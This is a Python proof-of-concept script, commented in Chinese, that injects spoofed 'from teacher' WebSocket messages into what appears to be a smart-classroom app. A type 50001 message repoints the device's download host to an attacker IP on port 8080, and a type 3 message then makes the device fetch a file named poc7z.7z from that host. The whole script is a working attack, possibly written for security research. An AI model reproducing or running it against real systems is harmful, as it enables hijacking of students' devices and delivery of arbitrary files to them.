# -*- coding: utf-8 -*-
"""inject_50001_exact.py - 用报告里 S1-50001 的精确格式重发, 验证 isOpenFtp 是否生效。
判据: 假课堂 8080 是否收到端侧下载请求。
"""
import json
import os
import time

BASE = os.path.dirname(os.path.abspath(__file__))
INJ = os.path.join(BASE, "ws_inject.txt")
OUR = "192.168.137.1"
ROOM = "UXHOVJJF"
UID = "2112229"


def s1(mtype, data, cid, tag="default_tag", cmd=0):
    # 报告里的精确格式: from=teacher, ct="", gt=0
    return json.dumps({
        "cmd": cmd, "ct": "", "from": "teacher", "gt": 0, "cId": cid,
        "smsg": {"classRoomId": ROOM, "createTag": tag, "data": data,
                 "forward": 0, "senderId": 0, "type": mtype, "userIds": UID},
    }, ensure_ascii=False)


def inj(js, label, wait=10):
    with open(INJ, "w", encoding="utf-8") as f:
        f.write(js)
    print("INJ %s" % label, flush=True)
    time.sleep(wait)


def main():
    ftp = {"hostName": OUR, "port": 8080, "rootPath": "/mnt/sdcard/xhproxy",
           "downloadWaitTime": 3, "startLimitRate": 0.015}
    inj(s1(50001, json.dumps(ftp, ensure_ascii=False), "179P00070"), "50001 (from=teacher)", 15)
    # 之后触发一次短语下载(看它走 8080 还是 80)
    phrase = {"voiceId": "poc7z", "voiceUrl": "http://%s/poc7z.7z" % OUR}
    inj(s1(3, json.dumps(phrase, ensure_ascii=False), "179P00071", "canvas_tag", 2),
        "type=3 短语", 15)
    # 再补一次 50001(防顺序问题) + 短语
    inj(s1(50001, json.dumps(ftp, ensure_ascii=False), "179P00072"), "50001 again", 15)
    inj(s1(3, json.dumps(phrase, ensure_ascii=False), "179P00073", "canvas_tag", 2),
        "type=3 again", 15)
    print("done", flush=True)


if __name__ == "__main__":
    main()
